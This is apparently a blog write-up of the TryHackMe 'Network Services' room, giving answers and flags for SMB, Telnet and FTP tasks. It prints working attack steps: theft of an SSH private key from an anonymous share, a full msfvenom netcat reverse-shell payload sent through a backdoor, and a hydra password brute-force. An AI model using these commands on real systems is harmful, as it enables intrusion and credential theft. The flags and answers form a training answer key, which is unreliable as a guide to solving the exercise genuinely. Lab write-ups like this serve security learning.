I" E<p>It‚Äôs a write-up about the room : <a href="https://tryhackme.com/room/networkservices">Try Hack Me - Room : Network Services</a></p>

<h1 id="task-1-get-connected">[Task 1] Get Connected</h1>

<blockquote>
  <p>This room will explore common Network Service vulnerabilities and misconfigurations.</p>
</blockquote>

<h1 id="task-2---understanding-smb">[Task 2] - Understanding SMB</h1>

<p><img src="/assets/img/thm/network-services/task-1.png" alt="Task 1" /></p>

<ul>
  <li>
    <p>What does SMB stand for? <code class="language-plaintext highlighter-rouge">Server Message Block</code></p>
  </li>
  <li>
    <p>What type of protocol is SMB? <code class="language-plaintext highlighter-rouge">response-request</code></p>
  </li>
  <li>
    <p>What do clients connect to servers using? <code class="language-plaintext highlighter-rouge">tcp/ip</code></p>
  </li>
  <li>
    <p>What systems does Samba run on? <code class="language-plaintext highlighter-rouge">Unix</code></p>
  </li>
</ul>

<h1 id="task-3---enumerating-smb">[Task 3] - Enumerating SMB</h1>

<p><img src="/assets/img/thm/network-services/task-3.png" alt="Task 3" /></p>

<p>We scan all ports using <code class="language-plaintext highlighter-rouge">sudo nmap -sV -sC ip_machine</code></p>

<ul>
  <li>
    <p>Conduct an nmap scan of your choosing, How many ports are open? <code class="language-plaintext highlighter-rouge">3</code></p>
  </li>
  <li>
    <p>What ports is SMB running on? <code class="language-plaintext highlighter-rouge">139/445</code></p>
  </li>
  <li>
    <p>Let‚Äôs get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name? <code class="language-plaintext highlighter-rouge">WORKGROUP</code></p>
  </li>
  <li>
    <p>Let‚Äôs get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name? <code class="language-plaintext highlighter-rouge">polosmb</code></p>
  </li>
  <li>
    <p>What operating system version is running? <code class="language-plaintext highlighter-rouge">6.1</code></p>
  </li>
  <li>
    <p>What share sticks out as something we might want to investigate? <code class="language-plaintext highlighter-rouge">profiles</code></p>
  </li>
</ul>

<h1 id="task-4---exploiting-smb">[Task 4] - Exploiting SMB</h1>

<p><img src="/assets/img/thm/network-services/task-4.png" alt="Task 4" /></p>

<ul>
  <li>What would be the correct syntax to access an SMB share called ‚Äúsecret‚Äù as user ‚Äúsuit‚Äù on a machine with the IP 10.10.10.2 on the default port?</li>
</ul>

<p>We find that default SMB port are 139 and 445 by googling. <br />
So, the correct syntax to access is : <code class="language-plaintext highlighter-rouge">smbclient //10.10.10.2/secret -U suit -p 139</code></p>

<ul>
  <li>
    <p>Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn‚Äôt require authentication to view the files. We can do this easily by:</p>
  </li>
  <li>
    <p>using the username ‚ÄúAnonymous‚Äù</p>
  </li>
  <li>
    <p>connecting to the share we found during the enumeration stage</p>
  </li>
  <li>
    <p>and not supplying a password.</p>
  </li>
</ul>

<p>Does the share allow anonymous access? Y/N? <code class="language-plaintext highlighter-rouge">Y</code></p>

<p>We use : <code class="language-plaintext highlighter-rouge">smbclient //10.10.244.174/profiles -U Anonymous -p 139</code></p>

<ul>
  <li>Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">get "Working From Home Information.txt"</code>
This file is a copy of an e-mail adressed to <strong>John Cactus</strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>John Cactus

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever possible, employees should work from home. As such- your account has now been enabled with ssh access to the main server. 

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards, 

James
Department Manager
</pre></td></tr></tbody></table></code></pre></div></div>

<ul>
  <li>What service has been configured to allow him to work from home? <code class="language-plaintext highlighter-rouge">ssh</code></li>
</ul>

<p>We use <code class="language-plaintext highlighter-rouge">ls</code> and find the directory <strong>.ssh</strong>.</p>

<ul>
  <li>This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?</li>
</ul>

<p>We use <code class="language-plaintext highlighter-rouge">ls</code> to see the differents files :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>id_rsa
id_rsa.pub
authorized_keys
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The most useful key for us is <strong>id_rsa</strong>.</p>

<ul>
  <li>Download this file to your local machine, and change the permissions to ‚Äú600‚Äù using ‚Äúchmod 600 [file]‚Äù. 
Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server. 
What is the smb.txt flag?</li>
</ul>

<p>So, we get it <code class="language-plaintext highlighter-rouge">get id_rsa</code>. We change the permission of the file <code class="language-plaintext highlighter-rouge">chmod 600</code>.<br />
After that, we connect with ssh :  <code class="language-plaintext highlighter-rouge">ssh -i id_rsa cactus@ip_machine</code>.</p>

<p>We use <code class="language-plaintext highlighter-rouge">ls</code>. There is the file <code class="language-plaintext highlighter-rouge">smb.txt</code>, so : <code class="language-plaintext highlighter-rouge">cat smb.txt</code>. <br />
The flag is <code class="language-plaintext highlighter-rouge">THM{smb_is_fun_eh?}</code>.</p>

<h1 id="task-5---understanding-telnet">[Task 5] - Understanding Telnet</h1>

<p><img src="/assets/img/thm/network-services/task-5.png" alt="Task 5" /></p>

<ul>
  <li>
    <p>What is Telnet? <code class="language-plaintext highlighter-rouge">application protocol</code></p>
  </li>
  <li>
    <p>What has slowly replaced Telnet? <code class="language-plaintext highlighter-rouge">ssh</code></p>
  </li>
  <li>
    <p>How would you connect to a Telnet server with the IP 10.10.10.3 on port 23? <code class="language-plaintext highlighter-rouge">telnet 10.10.10.3 23</code></p>
  </li>
  <li>
    <p>The lack of what, means that all Telnet communication is in plaintext? <code class="language-plaintext highlighter-rouge">encryption</code></p>
  </li>
</ul>

<h1 id="task-6---enumerating-telnet">[Task 6] - Enumerating Telnet</h1>

<blockquote>
  <p>We‚Äôve already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don‚Äôt always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method.</p>
</blockquote>

<blockquote>
  <p>Let‚Äôs start out the same way we usually do, a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine. Scan the machine with nmap and the tag -A and -p-.</p>
</blockquote>

<p>We deploy the instance.</p>

<ul>
  <li>How many ports are open on the target machine?</li>
</ul>

<p>We use nmap : <code class="language-plaintext highlighter-rouge">nmap -A -p- ip_machine</code> and find <code class="language-plaintext highlighter-rouge">1</code> port opened.</p>

<ul>
  <li>
    <p>What port is this ? <code class="language-plaintext highlighter-rouge">8012</code></p>
  </li>
  <li>
    <p>This port is unassigned, but still lists the protocol it‚Äôs using, what protocol is this? <code class="language-plaintext highlighter-rouge">tcp</code></p>
  </li>
  <li>
    <p>Now re-run the nmap scan, without the -p- tag, how many ports show up as open?</p>
  </li>
</ul>

<p>We use : <code class="language-plaintext highlighter-rouge">nmap -A ip_machine</code> and find <code class="language-plaintext highlighter-rouge">0</code> port opened.</p>

<ul>
  <li>
    <p>Based on the title returned to us, what do we think this port could be used for? <code class="language-plaintext highlighter-rouge">a backdoor</code></p>
  </li>
  <li>
    <p>Who could it belong to? Gathering possible usernames is an important step in enumeration. <code class="language-plaintext highlighter-rouge">skidy</code></p>
  </li>
</ul>

<h1 id="task-7---exploiting-telnet">[Task 7] - Exploiting Telnet</h1>

<blockquote>
  <p>Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control.</p>
</blockquote>

<p><img src="/assets/img/thm/network-services/task-7.png" alt="Task 7" /></p>

<ul>
  <li>
    <p>Great! It‚Äôs an open telnet connection! What welcome message do we receive? <code class="language-plaintext highlighter-rouge">Skidy's backdoor</code></p>
  </li>
  <li>
    <p>Let‚Äôs try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N) <code class="language-plaintext highlighter-rouge">N</code></p>
  </li>
  <li>
    <p>Now, use the command ‚Äúping [local tun0 ip] -c 1‚Äù through the telnet session to see if we‚Äôre able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N) <code class="language-plaintext highlighter-rouge">Y</code></p>
  </li>
  <li>
    <p>We‚Äôre going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here‚Äôs our syntax: <code class="language-plaintext highlighter-rouge">msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R</code></p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>-p = payload
lhost = our local host IP address
lport = the port to listen on
R = export the payload in raw format
</pre></td></tr></tbody></table></code></pre></div></div>

<p>What word does the generated payload start with?</p>

<p>We use : <code class="language-plaintext highlighter-rouge">msfvenom -p cmd/unix/reverse_netcat lhost=local lport=4444 R</code>.<br />
The output is : <code class="language-plaintext highlighter-rouge">mkfifo /tmp/jwgd; nc 10.10.54.200 4444 0&lt;/tmp/jwgd | /bin/sh &gt;/tmp/jwgd 2&gt;&amp;1; rm /tmp/jwgd</code>.<br />
local is the local ip not the ip machine.</p>

<p>Therefore, the generated payload start with <code class="language-plaintext highlighter-rouge">mkfifo</code>.</p>

<ul>
  <li>Perfect. We‚Äôre nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">nc -lvp [listening port]</code></p>

<p>What would the command look like for the listening port we selected in our payload? <code class="language-plaintext highlighter-rouge">nc -lvp 4444</code></p>

<ul>
  <li>Success! What is the contents of flag.txt?</li>
</ul>

<p>We use <code class="language-plaintext highlighter-rouge">nc -lvp 444</code> on one terminal. In an other we connecte with telnet : <code class="language-plaintext highlighter-rouge">telnet ip_machine 8012</code> and run the payload : <code class="language-plaintext highlighter-rouge">.RUN mkfifo ...</code>. <br />
On the terminal with netcat we can use the shell, so <code class="language-plaintext highlighter-rouge">ls</code> and find a <code class="language-plaintext highlighter-rouge">flag.txt</code> file.<br />
We read it and the content is <code class="language-plaintext highlighter-rouge">THM{y0u_g0t_th3_t3ln3t_fl4g}</code>.</p>

<h1 id="task-8---understanding-ftp">[Task 8] - Understanding FTP</h1>

<p><img src="/assets/img/thm/network-services/task-8.png" alt="Task 8" /></p>

<ul>
  <li>
    <p>What communications model does FTP use? <code class="language-plaintext highlighter-rouge">client-server</code></p>
  </li>
  <li>
    <p>What‚Äôs the standard FTP port? <code class="language-plaintext highlighter-rouge">21</code></p>
  </li>
  <li>
    <p>How many modes of FTP connection are there? <code class="language-plaintext highlighter-rouge">2</code></p>
  </li>
</ul>

<h1 id="task-9---enumerating-ftp">[Task 9] - Enumerating FTP</h1>

<blockquote>
  <p>We‚Äôre going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.</p>
</blockquote>

<ul>
  <li>Run an nmap scan of your choice. How many ports are open on the target machine?</li>
</ul>

<p>We use <code class="language-plaintext highlighter-rouge">nmap -A -sV -p- ip_machine</code> and find <code class="language-plaintext highlighter-rouge">2</code> ports opened.</p>

<ul>
  <li>What port is ftp running on?</li>
</ul>

<p>We have :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24 11:16 PUBLIC_NOTICE.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.87.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
</pre></td></tr></tbody></table></code></pre></div></div>

<p>FTp was running on port <code class="language-plaintext highlighter-rouge">21</code>.</p>

<ul>
  <li>
    <p>What variant of FTP is running on it? <code class="language-plaintext highlighter-rouge">vsFTPd</code></p>
  </li>
  <li>
    <p>Great, now we know what type of FTP server we‚Äôre dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing ‚Äúftp [IP]‚Äù into the console, and entering ‚Äúanonymous‚Äù, and no password when prompted.</p>
  </li>
</ul>

<p>What is the name of the file in the anonymous FTP directory?</p>

<p>We use <code class="language-plaintext highlighter-rouge">ftp ip_machine</code> with the login <code class="language-plaintext highlighter-rouge">anonymous</code>.<br />
After that, we use the command <code class="language-plaintext highlighter-rouge">ls</code> and find the file <strong>PUBLIC_NOTICE.txt</strong>.</p>

<ul>
  <li>What do we think a possible username could be?</li>
</ul>

<p>We get the file with <code class="language-plaintext highlighter-rouge">get PUBLIC_NOTICE.txt</code> and read it with <code class="language-plaintext highlighter-rouge">cat</code> : <code class="language-plaintext highlighter-rouge">cat PUBLIC_NOTICE.txt</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike 
</pre></td></tr></tbody></table></code></pre></div></div>

<p>A possible username can be <code class="language-plaintext highlighter-rouge">Mike</code>.</p>

<h1 id="task-10---exploiting-ftp">[Task 10] - Exploiting FTP</h1>

<p><img src="/assets/img/thm/network-services/task-10.png" alt="Task 10" /></p>

<ul>
  <li>What is the password for the user ‚Äúmike‚Äù?</li>
</ul>

<p>We use hydra : <code class="language-plaintext highlighter-rouge">hydra -t 4 -l mike -P rockyou.txt -vV ip_machine ftp</code> and find the password : <strong>password</strong>.</p>

<ul>
  <li>What is ftp.txt?</li>
</ul>

<p>We connecte with ftp : <code class="language-plaintext highlighter-rouge">ftp ip_machine</code> with the login <code class="language-plaintext highlighter-rouge">mike</code> and the password <code class="language-plaintext highlighter-rouge">password</code>.<br />
We use <code class="language-plaintext highlighter-rouge">ls</code> and find the file <code class="language-plaintext highlighter-rouge">ftp.txt</code>. We get it with <code class="language-plaintext highlighter-rouge">get ftp.txt</code>. We read it with the command <code class="language-plaintext highlighter-rouge">cat ftp.txt</code>.<br />
The flag is <code class="language-plaintext highlighter-rouge">THM{y0u_g0t_th3_ftp_fl4g}</code>.</p>
:ET